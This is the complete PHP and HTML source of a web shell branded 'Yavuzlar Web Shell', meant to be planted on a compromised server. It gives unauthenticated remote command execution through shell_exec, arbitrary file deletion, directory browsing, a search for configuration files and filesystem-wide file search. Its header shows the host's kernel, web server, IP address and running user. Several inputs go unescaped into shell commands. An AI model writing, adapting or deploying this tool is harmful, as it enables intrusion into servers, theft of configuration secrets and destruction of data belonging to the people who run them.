<?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_file'])) {
      $fileToDelete = $_POST['delete_file'];
      if (file_exists($fileToDelete)) {
          unlink($fileToDelete);
      }
  }
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Yavuzlar Web Shell</title>
    <link
      rel="shortcut icon"
      href="https://i.imgur.com/u5hzOm1.png"
      type="image/png"
    />
    <style>
      body {
        background-color: black;
        font-family: "Courier New", Courier, monospace;
      }
      .container {
        border: 1px solid green;
        border-radius: 10px;
      }
      .header {
        color: whitesmoke;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border-bottom: 1px solid green;
        padding-inline: 20px;
      }
      .header-left,
      .header-right {
        height: 100%;
        width: 100%;
        display: flex;
        align-items: center;
        background-color: black;
        font-size: 18px;
        padding: 30px 0;
        line-height: 1.2;
      }
      .header-right {
        border-left: 1px solid green;
        justify-content: center;
        position: relative;
      }
      .header-right__image {
        width: 550px;
      }
      .header-right__text {
        position: absolute;
        bottom: 0;
        right: 0;
        color: white;
      }
      .nav {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 5px;
        font-size: 18px;
        padding: 10px 0;
        border-bottom: 1px solid green;
        color: green;
      }
      .nav-item {
        color: green;
        text-decoration: none;
        font-weight: bold;
        height: 100%;
        padding: 5px 10px;
        border: 1px solid transparent;
        cursor: pointer;
      }
      .nav-item:hover {
        font-weight: bold;
        border: 1px solid green;
      }
      .active {
        color: lime;
        font-weight: bold;
      }
      .content {
        color: lime;
        padding: 20px 50px;
        font-size: 18px;
        display: flex;
        align-items: center;
        flex-direction: column;
        justify-content:center;
      }
      .shell-output {
        height: 350px;
        border: 1px solid green;
        background-color: #222222;
        color: whitesmoke;
        margin-bottom: 15px;
        resize: none;
        width: 100%;
        font-size: 16px;
        padding: 10px;
      }
      .shell-output:focus {
        outline:none;
      }
      .shell-input,
      .shell-button {
        padding: 5px 10px;
        font-size: 16px;
        border: 1px solid green;
        background-color: #222222;
        color: lime;
      }
      .shell-input {
        width: 300px;
      }
      .shell-input:focus {
        outline: none;
      }
      .shell-button:hover {
        background-color: green;
        color: #222222;
        cursor: pointer;
      }
      .file-margin {
        margin-top: 10px;
      }
      .file-search, .file-button {
        padding: 5px 10px;
        font-size: 16px;
        border: 1px solid green;
        background-color: #222222;
        color: lime;
      }
      .file-table {
        margin-top: 30px;
      }
      .file-button:hover {
        background-color: green;
        color: #222222;
        cursor: pointer;
      }
      td, th {
        padding: 5px 10px;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="header">
        <div class="header-left">
          OS: Linux <?php echo(shell_exec('uname -r')) ?> <br />
          Web Server: <?php echo(shell_exec('apache2 -v 2>/dev/null | grep -oP "Apache/\d+\.\d+\.\d+" || nginx -v 2>&1 | grep -oP "nginx/\d+\.\d+\.\d+"')) ?><br />
          Server IP: <?php echo(shell_exec('hostname -I')) ?> <br />
          Your IP: <?php echo($_SERVER['REMOTE_ADDR']) ?> <br />
          User: <?php echo(shell_exec('whoami')) ?>
        </div>
        <div class="header-right">
          <img
            class="header-right__image"
            src="https://i.imgur.com/T4QwAOO.png"
          />
          <a href="https://yavuzlar.org" target="_blank">
            <p class="header-right__text">yavuzlar.org</p>
          </a>
        </div>
      </div>
      <div class="nav">
        <a href="?command-shell" class="nav-item" id="command-shell">Command Shell</a>//
        <a href="?file-manager" class="nav-item" id="file-manager">File Manager</a>//
        <a href="?config-finder" class="nav-item" id="config-finder">Config Finder</a>//
        <a href="?search-file" class="nav-item" id="search-file">Search File</a>//
        <a href="?file-perms" class="nav-item" id="file-perms">File Perms</a>
      </div>
      <div class="content">
      </div>
    </div>
    <script>
      let commandShell = document.querySelector("#command-shell");
      let fileManager = document.querySelector("#file-manager");
      let configFinder = document.querySelector("#config-finder");
      let searchFile = document.querySelector("#search-file");
      let filePerms = document.querySelector("#file-perms");
      let navItems = [commandShell, fileManager, configFinder, searchFile, filePerms];
      let content = document.querySelector(".content");
      let path = window.location.search.substring(1);
      if (!path){
        window.location.search = "?command-shell";
        let path = window.location.search.substring(1);
      }

      detectPage();
      function detectPage(){
        switch(path) {
          case "command-shell":
            commandShellFunction();
            break;
          case "file-manager":
            fileManagerFunction();
            break;
          case "config-finder":
            configFinderFunction();
            break;
          case "search-file":
            searchFileFunction();
            break;
          case "file-perms":
            filePermsFunction();
            break;
          default:
            break;
        } 
      }

      function commandShellFunction(){
        navItems.forEach(function(item) {
          item.style.color = "green";
        });
        commandShell.style.color = "lime";

        content.innerHTML = `
          <textarea class="shell-output" readonly><?php
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                $command = $_POST['command']; 
                if (!empty($command)) {
                  $output = shell_exec($command);
                  if (!empty($output)){
                    echo htmlspecialchars($output);   
                  }
              }
            }
          ?></textarea>
          <form method="POST">
            <input type="text" name="command" placeholder="Enter a command..." class="shell-input" required>
            <input type="submit" value="Execute" class="shell-button">
          </form>
        `;
      }

      function fileManagerFunction() {
            navItems.forEach(function(item) {
                item.style.color = "green";
            });
            fileManager.style.color = "lime";

            content.innerHTML = `
                <div class="file-margin">
                    <form method="POST">
                        <input type="text" name="path" class="file-search" placeholder="Enter a path.." required>
                        <button type="submit" class="file-button">Search</button>
                    </form>
                </div>
                <table class="file-table" border="1">
                    <tr>
                        <th>File Name</th>
                        <th>Actions</th>
                    </tr>
                    <?php
                    if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['path'])) {
                        $path = escapeshellarg($_POST['path']); 

                        $files = shell_exec("ls $path 2>&1");
                        $fileArray = explode("\n", trim($files));

                        foreach ($fileArray as $file) {
                            if (!empty($file)) {
                                echo "<tr>
                                        <td>{$file}</td>
                                        <td>
                                            <form method='POST' style='display:inline;'>
                                                <input type='hidden' name='delete_file' value='$file'>
                                                <button class='file-button' type='submit'>Delete</button>
                                            </form>
                                            <form method='POST' style='display:inline;'>
                                                <input type='hidden' name='edit_file' value='$file'>
                                                <button class='file-button' type='submit'>Edit</button>
                                            </form>
                                        </td>
                                      </tr>";
                            }
                        }
                    }
                    ?>
                </table>
            `;
      }

      function configFinderFunction() {
        navItems.forEach(function(item) {
          item.style.color = "green";
        });
        configFinder.style.color = "lime";

        content.innerHTML = `
          <textarea class="shell-output" readonly><?php
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                $config = $_POST['config']; 
                if (!empty($config)) {
                  $output = shell_exec("find $config -type f \( -name '*.cfg' -o -name '*.conf' -o -name '*.ini' \)");
                  if (!empty($output)){
                  echo htmlspecialchars(trim($output));   
                }
              }
            }
          ?></textarea>
          <form method="POST">
            <input type="text" name="config" placeholder="Enter a path..." class="shell-input" required>
            <input type="submit" value="Find" class="shell-button">
          </form>
        `;
      }

      function searchFileFunction() {
        navItems.forEach(function(item) {
          item.style.color = "green";
        });
        searchFile.style.color = "lime";

        content.innerHTML = `
          <textarea class="shell-output" readonly><?php
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                $search = $_POST['search']; 
                if (!empty($search)) {
                  $output = shell_exec("find / -name '$search*' 2>/dev/null");
                  if (!empty($output)){
                  echo htmlspecialchars(trim($output));   
                }
              }
            }
          ?></textarea>
          <form method="POST">
            <input type="text" name="search" placeholder="Enter a file name..." class="shell-input" required>
            <input type="submit" value="Search" class="shell-button">
          </form>
        `;
      }

      function filePermsFunction() {
        navItems.forEach(function(item) {
          item.style.color = "green";
        });
        filePerms.style.color = "lime";

        content.innerHTML = `
          <textarea class="shell-output" readonly><?php
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                $perms = $_POST['perms']; 
                if (!empty($perms)) {
                  $output = shell_exec("ls $perms -lha");
                  if (!empty($output)){
                  echo htmlspecialchars(trim($output));   
                }
              }
            }
          ?></textarea>
          <form method="POST">
            <input type="text" name="perms" placeholder="Enter a path..." class="shell-input" required>
            <input type="submit" value="View" class="shell-button">
          </form>
        `;        
      }
    </script>
  </body>
</html>

